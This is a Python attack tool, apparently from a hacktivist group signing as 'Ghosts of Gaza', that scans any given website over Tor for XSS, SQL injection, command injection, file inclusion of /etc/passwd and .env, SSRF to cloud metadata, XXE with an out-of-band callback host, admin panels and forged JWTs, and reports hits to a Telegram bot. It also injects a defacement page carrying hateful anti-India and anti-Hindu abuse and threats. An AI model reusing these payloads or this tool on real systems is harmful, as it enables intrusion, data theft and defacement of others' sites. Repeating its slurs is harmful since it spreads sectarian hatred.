import requests
from telegram import Bot
from config import TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID
from bs4 import BeautifulSoup
import re
import time
from urllib.parse import urljoin, parse_qs, urlparse
import json
import csv
import asyncio
import aiohttp
from aiohttp import ClientSession, ClientResponse
from aiohttp_socks import ProxyConnector
from tqdm import tqdm
import jwt
import threading
from queue import Queue
import os
import sys
from datetime import datetime
import random
import urllib.parse
import openpyxl
from openpyxl.styles import PatternFill, Font
import jsbeautifier
from graphqlclient import GraphQLClient
from fake_useragent import UserAgent
import websocket
import hashlib
from typing import List

# –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
vuln_count = 0
results = {
    'vulnerabilities': [],
    'injections': [],
    'flags': [],
    'admin_access': [],
    'db_dumps': [],
    'contest_logs': [],
    'js_flags': [],
    'graphql': []
}

# CONFIG
CONFIG = {
    'xss_payloads': [
        "<script>alert('Test by W1ndY')</script>",
        "<img src=x onerror=alert('Test by W1ndY')>",
        "<input type='text' onfocus=alert('Test by W1ndY') autofocus>",
        "<a href=\"javascript:alert('Test by W1ndY')\">Click</a>",
    ],
    'sqli_payloads': [
        "' OR '1'='1",
        "1' AND SLEEP(5)--",
        "' UNION SELECT 1,@@version--",
    ],
    'rce_payloads': [
        "whoami",
        "id",
        "ping -c 4 127.0.0.1",
    ],
    'lfi_payloads': ["../config.php", "../.env", "../../etc/passwd"],
    'ssrf_payloads': [
        "http://localhost",
        "http://127.0.0.1",
        "http://169.254.169.254/latest/meta-data/",
        "aitrvoogzajsayjydroali2olq7h94dxn.oast.fun"  # Interact.sh
    ],
    'xxe_payloads': [
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY x SYSTEM "file:///etc/hosts">]><x>&x;</x>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY x SYSTEM "aitrvoogzajsayjydroali2olq7h94dxn.oast.fun">]><x>&x;</x>',
    ],
    'graphql_queries': [
        '{schema{types{name}}}',
        '{users{id,username}}',
    ],
    'admin_paths': [
        "/admin", "/graphql", "/api/v1/users", "/panel", "/login", "/dashboard",
        "/api", "/websocket", "/ws", "/superuser",
    ],
    'custom_html': """
<div style="background: #000; color: #0f0; text-align: center; font-family: monospace; padding: 20px; text-shadow: 0 0 10px #0f0;">
    <img src="https://upload.wikimedia.org/wikipedia/commons/f/f5/Flag_of_Palestine.svg" style="width: 50px; height: 30px;" alt="Palestine">
    <p style="font-size: 24px; font-weight: bold;">THIS WEBSITE HAS BEEN HACKED BY \"W1ndY\"</p>
    <p>Hey there admin, we have hacked your system</p>
    <p>India is just a bunch of shit. We're always with Pakistan. Your Cyber space will be fucked like crap. Be ready for our reply.</p>
    <p>We are anonymous, We are Muslim Black Hat Hacktivist</p>
    <p><h2>India's fate is on Muslim's hand</h2></p>
    <p><h2>Hindustan will be conquered by the Muslim's In Sha Allah ‚òùÔ∏è</h2></p>
    <p>We are #GHOSTS OF GAZA</p>
    <p>Our channel: <a href="https://t.me/gostsofgaza" style="color: #0f0;">https://t.me/gostsofgaza</a></p>
    <h2 style="color: #0f0;">Greetz:</h2>
    <marquee behavior="scroll" direction="left" scrollamount="8" style="color: #0f0; font-weight: bold;">captain error | XrooT | W1ndY | Null-X</marquee>
</div>
""",
    'request_timeout': 10.0,
    'delay': 0.5,
    'threads': 3,
    'use_tor': True,
    'proxy_list': ['socks5://127.0.0.1:9050'] if True else [],
}

# –ë–∞–Ω–Ω–µ—Ä
def divine_banner():
    banners = [
        r"""
        üååüëª GOST'S OF GAZA üëªüåå
           ~
          | üíª W1ndY üí® 1337  |
          | üëæ‚ö°Ô∏è OMEGA ULTRA |
           ~
        W1ndY, the Galactic Anon Slayer üòà
        """,
        r"""
üî• GOST'S OF GAZA üî•
           ~
          | üíª W1ndY üí® 0101  |
          | üëæüåü ALPHA-OMEGA |
           ~
        W1ndY, Feared by Black Hats üòé
        """,
        r"""
        ‚ú® GOST'S OF GAZA ‚ú®
           ~
          | üíª W1ndY üí® 7777  |
          | üëæüî• NEON GALACTIC |
           ~
        """
    ]
    banner = random.choice(banners)
    print(f"\033[91m{banner}\033[0m")
    print(f"\033[92müåü Galactic Shine Time: {datetime.now().strftime('%H:%M %d/%m/%Y')} üåü\033[0m")
    print(f"\033[91müî• –•—Ä–∞–Ω–∏ –Ω–∞—Å –ì–æ—Å–ø–æ–¥—å –í—Å–µ–º–æ–≥—É—â–∏–π! We Rule the Galaxy! üî•\033[0m")

# Telegram-—É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è
async def send_to_telegram(vuln, bot_token=TELEGRAM_BOT_TOKEN, chat_id=TELEGRAM_CHAT_ID):
    global vuln_count
    vuln_count += 1
    try:
        bot = Bot(token=bot_token)
        if vuln_count % 10 == 0:
            await bot.send_message(chat_id=chat_id, text=f"üî• –ù–∞–π–¥–µ–Ω–æ {vuln_count} —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π! –ü–æ—Å–ª–µ–¥–Ω—è—è: {vuln}")
        else:
            await bot.send_message(chat_id=chat_id, text=vuln)
    except Exception as e:
        print(f"\033[93m‚ö†Ô∏è Telegram Error: {e}\033[0m")

# –ê—Å–∏–Ω—Ö—Ä–æ–Ω–Ω—ã–π –∑–∞–ø—Ä–æ—Å
async def async_request(session: ClientSession, method: str, url: str, data=None, params=None) -> ClientResponse:
    print(f"\033[93mDEBUG: Requesting {method} {url}\033[0m")
    try:
        async with session.request(
            method,
            url,
            data=data,
            params=params,
            headers={'User-Agent': UserAgent().random},
            timeout=CONFIG['request_timeout']
        ) as response:
            response.text = await response.text()
            print(f"\033[92mDEBUG: Response from {url} - Status: {response.status}\033[0m")
            return response
    except Exception as e:
        print(f"\033[91mDEBUG: Error for {url}: {e}\033[0m")
        return None


# –ò–Ω—ä–µ–∫—Ü–∏—è –ø–µ–π–ª–æ–∞–¥–æ–≤
async def inject_payload(session: ClientSession, url: str, vuln_type: str, payload: str) -> bool:
    test_data = {'input': payload} if vuln_type != 'rce' else {'cmd': payload}
    response = await async_request(session, 'POST', url, data=test_data)
    if response:
        if vuln_type == 'xss' and payload in response.text:
            vuln = f"üíâ XSS by W1ndY: {url} —Å {payload}"
            results['injections'].append(vuln)
            print(f"\033[91müíâ VULN FOUND: {vuln}\033[0m")
            await send_to_telegram(vuln)
            results['contest_logs'].append(vuln)
            return True
        elif vuln_type == 'sqli' and 'error' in response.text.lower():
            vuln = f"üíâ SQLi by W1ndY: {url} —Å {payload}"
            results['injections'].append(vuln)
            print(f"\033[91müíâ VULN FOUND: {vuln}\033[0m")
            await send_to_telegram(vuln)
            results['contest_logs'].append(vuln)
            return True
        elif vuln_type == 'rce' and ('uid=' in response.text or 'pong' in response.text):
            vuln = f"üíâ RCE Detected: {url} with {payload}"
            results['injections'].append(vuln)
            print(f"\033[91m{vuln}\033[0m")
            await send_to_telegram(vuln)
            results['contest_logs'].append(vuln)
            return True
        elif vuln_type == 'lfi' and ('DB_PASSWORD' in response.text or 'root:' in response.text):
            vuln = f"üíâ LFI Detected: {url} with {payload}"
            results['injections'].append(vuln)
            print(f"\033[91m{vuln}\033[0m")
            await send_to_telegram(vuln)
            results['contest_logs'].append(vuln)
            return True
        elif vuln_type == 'ssrf':
            vuln = f"üíâ SSRF by W1ndY: {url} —Å {payload} (Check Interact.sh for OOB)"
            results['injections'].append(vuln)
            print(f"\033[91m{vuln}\033[0m")
            await send_to_telegram(vuln)
            results['contest_logs'].append(vuln)
            return True
        elif vuln_type == 'xxe':
            vuln = f"üíâ XXE by W1ndY: {url} —Å {payload} (Check Interact.sh for OOB)"
            results['injections'].append(vuln)
            print(f"\033[91m{vuln}\033[0m")
            await send_to_telegram(vuln)
            results['contest_logs'].append(vuln)
            return True
        elif vuln_type == 'graphql' and ('__schema' in response.text or 'users' in response.text):
            vuln = f"üíâ GraphQL Detected: {url} —Å {payload}"
            results['injections'].append(vuln)
            print(f"\033[91m{vuln}\033[0m")
            await send_to_telegram(vuln)
            results['contest_logs'].append(vuln)
            return True
    return False

# –ò–Ω—ä–µ–∫—Ü–∏—è HTML
async def inject_html(session: ClientSession, url: str, vuln_type: str, payload: str) -> bool:
    test_data = {'input': CONFIG['custom_html']}
    response = await async_request(session, 'POST', url, data=test_data)
    if response and 'W1ndY' in response.text:
        vuln = f"üíâ HTML Shined: {url} —Å {vuln_type} payload: {payload}"
        results['injections'].append(vuln)
        print(f"\033[91m{vuln}\033[0m")
        await send_to_telegram(vuln)
        results['contest_logs'].append(vuln)
        return True
    return False

# –î–æ—Å—Ç—É–ø –∫ –∞–¥–º–∏–Ω–∫–µ
async def get_admin_access(session: ClientSession, url: str) -> None:
    for name, value in session.cookie_jar:
        if re.match(r'eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+', value):
            try:
                decoded = jwt.decode(value, options={"verify_signature": False})
                if 'admin' in str(decoded).lower() or 'role' in decoded:
                    vuln = f"üîë Galactic JWT Breach: {name}: {decoded}"
                    results['admin_access'].append(vuln)
                    print(f"\033[91m{vuln}\033[0m")
                    await send_to_telegram(vuln)
                    results['contest_logs'].append(vuln)
                    for path in CONFIG['admin_paths']:
                        admin_url = urljoin(url, path)
                        response = await async_request(session, 'GET', admin_url)
                        if response and 'admin' in response.text.lower():
                            vuln = f"üîê Galactic Admin Citadel Shined: {admin_url}"
                            results['admin_access'].append(vuln)
                            print(f"\033[91m{vuln}\033[0m")
                            await send_to_telegram(vuln)
                            results['contest_logs'].append(vuln)
            except:
                pass
    for path in CONFIG['admin_paths']:
        admin_url = urljoin(url, path)
        response = await async_request(session, 'GET', admin_url)
        if response and response.status == 200 and 'login' not in response.text.lower():
            vuln = f"üîê Galactic Admin Access: {admin_url} (No auth)"
            results['admin_access'].append(vuln)
            print(f"\033[91m{vuln}\033[0m")
            await send_to_telegram(vuln)
            results['contest_logs'].append(vuln)
    login_url = urljoin(url, '/login')
    for payload in CONFIG['sqli_payloads']:
        test_data = {'username': payload, 'password': 'test'}
        response = await async_request(session, 'POST', login_url, data=test_data)
        if response and ('admin' in response.text.lower() or 'welcome' in response.text.lower()):
            vuln = f"üîì Galactic SQLi Admin Shine: {login_url} —Å {payload}"
            results['admin_access'].append(vuln)
            print(f"\033[91m{vuln}\033[0m")
            await send_to_telegram(vuln)
            results['contest_logs'].append(vuln)
    response = await async_request(session, 'GET', login_url)
    if response:
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        for form in forms:
            if 'csrf' not in str(form).lower():
                test_data = {'username': 'admin', 'password': 'test'}
                action = form.get('action', '/login')
                response = await async_request(session, 'POST', urljoin(url, action), data=test_data)
                if response and 'welcome' in response.text.lower():
                    vuln = f"üîì Galactic CSRF Admin Shine: {urljoin(url, action)}"
                    results['admin_access'].append(vuln)
                    print(f"\033[91m{vuln}\033[0m")
                    await send_to_telegram(vuln)
                    results['contest_logs'].append(vuln)
    for path in CONFIG['admin_paths']:
        for i in range(1, 5):
            test_url = f"{urljoin(url, path)}?user_id={i}"
            response = await async_request(session, 'GET', test_url)
            if response and 'admin' in response.text.lower():
                vuln = f"üîì Galactic IDOR Admin Shine: {test_url}"
                results['admin_access'].append(vuln)
                print(f"\033[91m{vuln}\033[0m")
                await send_to_telegram(vuln)
                results['contest_logs'].append(vuln)

# –ü–∞—Ä—Å–∏–Ω–≥ JS-—Ñ–∞–π–ª–æ–≤
async def parse_js_files(session: ClientSession, url: str, response: ClientResponse) -> List[str]:
    soup = BeautifulSoup(response.text, 'html.parser')
    js_files = [urljoin(url, script['src']) for script in soup.find_all('script', src=True)]
    flags = []
    for js_url in js_files:
        try:
            js_response = await async_request(session, 'GET', js_url)
            if js_response:
                beautified = jsbeautifier.beautify(js_response.text)
                flag_matches = re.findall(r'flag\{[A-Za-z0-9-_]+\}', beautified)
                for flag in flag_matches:
                    vuln = f"üö© Galactic JS Flag: {js_url}: {flag}"
                    results['js_flags'].append(vuln)
                    print(f"\033[91m{vuln}\033[0m")
                    await send_to_telegram(vuln)
                    results['contest_logs'].append(vuln)
                    flags.append(flag)
        except Exception as e:
            results['vulnerabilities'].append(f"JS Parse Error: {js_url}: {e}")
    return flags

# –ê—Ç–∞–∫–∞ GraphQL
async def attack_graphql(session: ClientSession, url: str) -> None:
    client = GraphQLClient(urljoin(url, '/graphql'))
    for query in CONFIG['graphql_queries']:
        try:
            response = await client.execute_async(query)
            if 'errors' not in response:
                vuln = f"üåê Galactic GraphQL: {url}/graphql —Å {query}: {response[:100]}"
                results['graphql'].append(vuln)
                print(f"\033[91m{vuln}\033[0m")
                await send_to_telegram(vuln)
                results['contest_logs'].append(vuln)
                if re.search(r'flag\{[A-Za-z0-9-_]+\}', str(response)):
                    flag = re.findall(r'flag\{[A-Za-z0-9-_]+\}', str(response))[0]
                    vuln = f"üö© Galactic GraphQL Flag: {flag}"
                    results['flags'].append(vuln)
                    print(f"\033[91m{vuln}\033[0m")
                    await send_to_telegram(vuln)
                    results['contest_logs'].append(vuln)
        except Exception as e:
            results['vulnerabilities'].append(f"GraphQL Error: {url}: {e}")

# –ê—Ç–∞–∫–∞ WebSocket
def attack_websocket(url: str) -> None:
    ws_url = url.replace('http', 'ws').replace('https', 'wss')
    try:
        ws = websocket.WebSocket()
        ws.connect(ws_url)
        ws.send("flag")
        response = ws.recv()
        if re.search(r'flag\{[A-Za-z0-9-_]+\}', response):
            flag = re.findall(r'flag\{[A-Za-z0-9-_]+\}', response)[0]
            vuln = f"üö© Galactic WebSocket Flag: {ws_url}: {flag}"
            results['flags'].append(vuln)
            print(f"\033[91m{vuln}\033[0m")
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(send_to_telegram(vuln))
            loop.close()
            results['contest_logs'].append(vuln)
        ws.close()
    except Exception as e:
        results['vulnerabilities'].append(f"WebSocket Error: {ws_url}: {e}")

# –ö—Ä—ç–∫–∏–Ω–≥ —Ö—ç—à–µ–π
def crack_hash(hash_str: str) -> str:
    hash_types = {'md5': hashlib.md5, 'sha1': hashlib.sha1}
    for h_type, h_func in hash_types.items():
        if len(hash_str) == len(h_func(b'').hexdigest()):
            return f"Possible {h_type}: {hash_str} (use hashkiller.io)"
    return None

# –≠–∫—Å–ø–æ—Ä—Ç –≤ Excel
def export_to_excel(results: dict, log_dir: str, timestamp: str) -> None:
    wb = openpyxl.Workbook()
    flag_pattern = r'flag\{[A-Za-z0-9-_]+\}'
    flag_fill = PatternFill(start_color="FF0000", end_color="FF0000", fill_type="solid")
    bold_font = Font(bold=True)

    ws_tables = wb.create_sheet("Tables")
    ws_tables.append(["Table Name"])
    for dump in results['db_dumps']:
        if isinstance(dump, dict):
            for table in dump.get('tables', []):
                ws_tables.append([table])

    ws_columns = wb.create_sheet("Columns")  # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –≤–Ω–µ —É—Å–ª–æ–≤–∏—è
    ws_columns.append(["Table", "Column Name"])
    for dump in results['db_dumps']:
        if isinstance(dump, dict):
            for column in dump.get('columns', []):
                ws_columns.append(["", column])

    ws_rows = wb.create_sheet("Rows")
    ws_rows.append(["Row Data"])
    for dump in results['db_dumps']:
        if isinstance(dump, dict):
            for row in dump.get('rows', []):
                ws_rows.append([row])
                if re.search(flag_pattern, row):
                    ws_rows.cell(row=ws_rows.max_row, column=1).fill = flag_fill

    ws_logs = wb.create_sheet("Logs")
    ws_logs.append(["Log Entry"])
    for log in results['contest_logs']:
        ws_logs.append([log])

    ws_vulns = wb.create_sheet("Vulnerabilities")
    ws_vulns.append(["Type", "Details"])
    for vuln in results['vulnerabilities']:
        ws_vulns.append(["Vulnerability", vuln])
    for flag in results['flags']:
        ws_vulns.append(["Flag", flag])

    for ws in [ws_tables, ws_columns, ws_rows, ws_logs, ws_vulns]:
        for cell in ws[1]:
            cell.font = bold_font

    if "Sheet" in wb.sheetnames:
        wb.remove(wb["Sheet"])

    excel_file = f'{log_dir}/shine_results_{timestamp}.xlsx'
    wb.save(excel_file)
    print(f"\033[92müìà Galactic Excel Shined: {excel_file}\033[0m")

# –ü—Ä–æ–≤–µ—Ä–∫–∞ Tor
def check_tor() -> None:
    proxies = {'http': 'socks5://127.0.0.1:9050', 'https': 'socks5://127.0.0.1:9050'}
    try:
        response = requests.get('https://check.torproject.org/api/ip', proxies=proxies)
        if response.json()['IsTor']:
            print("üî• Tor —Ä–∞–±–æ—Ç–∞–µ—Ç, —Ç—ã –≤ —Ç–µ–Ω–∏! üåå")
        else:
            print("‚ö†Ô∏è Tor –Ω–µ –∞–∫—Ç–∏–≤–µ–Ω!")
    except:
        print("‚ö†Ô∏è –û—à–∏–±–∫–∞: Tor –Ω–µ –∑–∞–ø—É—â–µ–Ω –∏–ª–∏ –ø–æ—Ä—Ç 9050 –∑–∞–Ω—è—Ç!")

# –ö–∞—Å—Ç–æ–º–∏–∑–∞—Ü–∏—è HTML
def customize_html() -> None:
    print("\033[92müåü –•–æ—á–µ—à—å —Å–≤–æ–π HTML –¥–ª—è –≥–∞–ª–∞–∫—Ç–∏—á–µ—Å–∫–æ–≥–æ —Å–∏—è–Ω–∏—è? (y/n)\033[0m")
    if input().lower() == 'y':
        print("\033[92m–í–≤–µ–¥–∏ HTML (–∏–ª–∏ Enter –¥–ª—è Neon Galactic):\033[0m")
        custom = input()
        if custom.strip():
            CONFIG['custom_html'] = custom
            print(f"\033[91müî• HTML –∑–∞—Ä—è–∂–µ–Ω: {custom[:50]}...\033[0m")
        else:
            print("\033[92mNeon Galactic HTML —Å–∏—è–µ—Ç!\033[0m")

# –ò–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω–æ–µ –º–µ–Ω—é
def interactive_menu() -> tuple[str, List[str]]:
    divine_banner()
    print("\nüåü Omega Ultra Galactic Menu by W1ndY üåü")
    print("1. –í–≤–µ–¥–∏ URL (–Ω–∞–ø—Ä–∏–º–µ—Ä, http://localhost/dvwa –∏–ª–∏ CTF-—Å–∞–π—Ç)")
    url = input("URL: ")
    print("\n2. –í—ã–±–µ—Ä–∏ –∞—Ç–∞–∫–∏: xss rce sqli lfi ssrf xxe admin inject db graphql js ws")
    attacks = input().lower().split() or ['xss', 'rce', 'sqli', 'lfi', 'ssrf', 'xxe', 'admin', 'inject', 'db', 'graphql', 'js', 'ws']
    print("\n3. –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å Tor –¥–ª—è –∞–Ω–æ–Ω–∏–º–Ω–æ—Å—Ç–∏? (y/n)")
    CONFIG['use_tor'] = input().lower() == 'y'
    customize_html()
    print("\n4. –ü–æ–¥—Ç–≤–µ—Ä–¥–∏ –∑–∞–ø—É—Å–∫ (y/n): ")
    if input().lower() != 'y':
        print("\033[91müö´ –°–∏—è–Ω–∏–µ –æ—Ç–ª–æ–∂–µ–Ω–æ,  W1ndY \033[0m")
        sys.exit(1)
    return url, attacks

# –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è
async def hack_website(url: str, attacks: List[str]) -> None:
    connector = ProxyConnector.from_url('socks5://127.0.0.1:9050') if CONFIG['use_tor'] else None
    async with aiohttp.ClientSession(headers={'User-Agent': UserAgent().random}, connector=connector) as session:
        response = await async_request(session, 'GET', url)
        if not response:
            print("\033[91müö® –°–∞–π—Ç –Ω–µ –æ—Ç–≤–µ—á–∞–µ—Ç! –ü—Ä–æ–≤–µ—Ä—è–π URL, W1ndY! üö®\033[0m")
            return
        soup = BeautifulSoup(response.text, 'html.parser')

        # Flag Finder
        flag_pattern = r'flag\{[A-Za-z0-9-_]+\}'
        for text in soup.stripped_strings:
            if re.search(flag_pattern, text):
                vuln = f"üö© Galactic CTF Flag: {text}"
                results['flags'].append(vuln)
                print(f"\033[91m{vuln}\033[0m")
                await send_to_telegram(vuln)
                results['contest_logs'].append(vuln)
        for header, value in response.headers.items():
            if re.search(flag_pattern, value):
                vuln = f"üö© Galactic CTF Flag in Header: {header}: {value}"
                results['flags'].append(vuln)
                print(f"\033[91m{vuln}\033[0m")
                await send_to_telegram(vuln)
                results['contest_logs'].append(vuln)
        for cookie in session.cookie_jar:
            if re.search(flag_pattern, cookie.value):
                vuln = f"üö© Galactic CTF Flag in Cookie: {cookie.name}: {cookie.value}"
                results['flags'].append(vuln)
                print(f"\033[91m{vuln}\033[0m")
                await send_to_telegram(vuln)
                results['contest_logs'].append(vuln)

        # JS Finder
        if 'js' in attacks:
            print("\033[92müîç –°–∫–∞–Ω–∏—Ä—É–µ–º JS, W1ndY! üî•\033[0m")
            await parse_js_files(session, url, response)

        # GraphQL –∏ WebSocket
        if 'graphql' in attacks:
            print("\033[92müîç –ê—Ç–∞–∫—É–µ–º GraphQL, W1ndY! üî•\033[0m")
            await attack_graphql(session, url)
        if 'ws' in attacks:
            print("\033[92müîç –ê—Ç–∞–∫—É–µ–º WebSocket, W1ndY! üî•\033[0m")
            attack_websocket(url)

        # Admin Access
        if 'admin' in attacks:
            print("\033[92müîç –ü—Ä–æ–≤–µ—Ä—è–µ–º –∞–¥–º–∏–Ω-–¥–æ—Å—Ç—É–ø, W1ndY! üî•\033[0m")
            await get_admin_access(session, url)

        # –ó–∞–ø–æ–ª–Ω–µ–Ω–∏–µ –æ—á–µ—Ä–µ–¥–∏ –∑–∞–ø—Ä–æ—Å–æ–≤
        request_queue = Queue()
        total_requests = 0
        for form in soup.find_all('form'):
            action = form.get('action', '')
            form_url = urljoin(url, action)
            inputs = form.find_all('input')
            for vuln_type in ['xss', 'sqli', 'rce', 'lfi', 'ssrf', 'xxe']:
                if vuln_type in attacks:
                    for payload in CONFIG[f'{vuln_type}_payloads']:
                        for input_tag in inputs:
                            name = input_tag.get('name')
                            if name:
                                test_data = {name: payload}
                                request_queue.put(('POST', form_url, test_data, payload, vuln_type))
                                total_requests += 1
                                if vuln_type in ['xss', 'sqli', 'lfi', 'ssrf', 'xxe']:
                                    request_queue.put(('GET', form_url, {name: payload}, payload, vuln_type))
                                    total_requests += 1
                                if vuln_type == 'inject':
                                    request_queue.put(('POST', form_url, {name: CONFIG['custom_html']}, payload, vuln_type))
                                    total_requests += 1
                                    # Worker –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ –æ—á–µ—Ä–µ–¥–∏
        async def worker():
            with tqdm(total=total_requests, desc="\033[91müî• W1ndY's Galactic Ultra\033[0m", unit="req", bar_format="{l_bar}\033[92m{bar}\033[0m{r_bar}") as pbar:
                while not request_queue.empty():
                    method, req_url, data, payload, attack_type = request_queue.get()
                    response = await async_request(session, method, req_url, data=data, params=data if method == 'GET' else None)
                    if not response:
                        pbar.update(1)
                        continue
                    if attack_type == 'xss' and any(p in response.text for p in CONFIG['xss_payloads']):
                        vuln = f"üî• Galactic XSS: {req_url} —Å {payload}"
                        results['vulnerabilities'].append(vuln)
                        print(f"\033[91m{vuln}\033[0m")
                        await send_to_telegram(vuln)
                        results['contest_logs'].append(vuln)
                        if 'inject' in attacks:
                            injected = await inject_html(session, req_url, 'xss', payload)
                    elif attack_type == 'rce' and any(marker in response.text.lower() for marker in ['uid=', 'whoami', 'w1ndy shines']):
                        vuln = f"üí• Galactic RCE: {req_url} —Å {payload}"
                        results['vulnerabilities'].append(vuln)
                        print(f"\033[91m{vuln}\033[0m")
                        await send_to_telegram(vuln)
                        results['contest_logs'].append(vuln)
                    elif attack_type == 'sqli' and ('sql' in response.text.lower() or 'error' in response.text.lower() or 'admin' in response.text.lower() or 'SLEEP' in payload):
                        vuln = f"‚ö†Ô∏è Galactic SQLi: {req_url} —Å {payload}"
                        results['vulnerabilities'].append(vuln)
                        print(f"\033[91m{vuln}\033[0m")
                        await send_to_telegram(vuln)
                        results['contest_logs'].append(vuln)
                    elif attack_type == 'lfi' and any(marker in response.text.lower() for marker in ['root:', '[extensions]', 'passwd', 'sqlite']):
                        vuln = f"üìÇ Galactic LFI: {req_url} —Å {payload}"
                        results['vulnerabilities'].append(vuln)
                        print(f"\033[91m{vuln}\033[0m")
                        await send_to_telegram(vuln)
                        results['contest_logs'].append(vuln)
                    elif attack_type == 'ssrf':
                        vuln = f"üåê Galactic SSRF: {req_url} —Å {payload} (Check Interact.sh for OOB)"
                        results['vulnerabilities'].append(vuln)
                        print(f"\033[91m{vuln}\033[0m")
                        await send_to_telegram(vuln)
                        results['contest_logs'].append(vuln)
                    elif attack_type == 'xxe':
                        vuln = f"üìÑ Galactic XXE: {req_url} —Å {payload} (Check Interact.sh for OOB)"
                        results['vulnerabilities'].append(vuln)
                        print(f"\033[91m{vuln}\033[0m")
                        await send_to_telegram(vuln)
                        results['contest_logs'].append(vuln)
                    elif attack_type == 'inject':
                        injected = await inject_html(session, req_url, 'xss', payload)
                    pbar.update(1)
                    time.sleep(CONFIG['delay'])
                    request_queue.task_done()

        threads = []
        for _ in range(CONFIG['threads']):
            t = threading.Thread(target=lambda: asyncio.run(worker()))
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
            # –õ–æ–≥–∏
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        log_dir = 'shine_logs'
        os.makedirs(log_dir, exist_ok=True)
        export_to_excel(results, log_dir, timestamp)
        with open(f'{log_dir}/shine_results_{timestamp}.json', 'w') as f:
            json.dump(results, f, indent=4)
        with open(f'{log_dir}/shine_results_{timestamp}.csv', 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(['Type', 'Details'])
            for vuln in results['vulnerabilities']:
                writer.writerow(['Vulnerability', vuln])
            for inj in results['injections']:
                writer.writerow(['Injection', inj])
            for flag in results['flags']:
                writer.writerow(['Flag', flag])
            for admin in results['admin_access']:
                writer.writerow(['Admin Access', admin])
            for db in results['db_dumps']:
                writer.writerow(['DB Dump', db])
            for log in results['contest_logs']:
                writer.writerow(['Contest Log', log])
        await send_to_telegram(
            f"üìà Galactic Test Complete! Found {len(results['vulnerabilities'] + results['injections'] + results['flags'])} vulns. Check shine_logs/shine_results_{timestamp}.xlsx and Interact.sh for OOB"
        )
        print(f"\n\033[92müíæ Galactic Shine Logs: {log_dir}/shine_results_{timestamp}.json, .csv, .xlsx. W1ndY, —Ç—ã –ø—É–≥–∞–µ—à—å –≥–∞–ª–∞–∫—Ç–∏–∫—É! üòà\033[0m")

# –¢–æ—á–∫–∞ –≤—Ö–æ–¥–∞
if __name__ == "__main__":
    print("\033[91müåå W1ndY! –°–∏—è–µ–º —è—Ä—á–µ –≥–∞–ª–∞–∫—Ç–∏–∫–∏, –ø—É–≥–∞–µ–º –≤—Ä–∞–≥–æ–≤! –•—Ä–∞–Ω–∏ –Ω–∞—Å –ì–æ—Å–ø–æ–¥—å –í—Å–µ–º–æ–≥—É—â–∏–π! üåü\033[0m")
    check_tor()
    url, attacks = interactive_menu()
    if url:
        asyncio.run(hack_website(url, attacks))